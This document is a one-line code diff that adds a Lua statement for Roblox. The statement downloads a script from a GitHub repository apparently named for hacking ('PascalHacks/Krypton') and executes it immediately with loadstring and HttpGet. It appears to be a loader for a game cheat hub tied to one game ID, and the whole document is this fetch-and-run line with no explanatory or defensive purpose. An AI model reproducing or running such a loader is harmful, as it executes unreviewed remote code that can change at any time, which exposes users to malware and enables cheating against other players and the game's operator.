@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PascalHacks/Krypton/main/Games/3431407618'))()
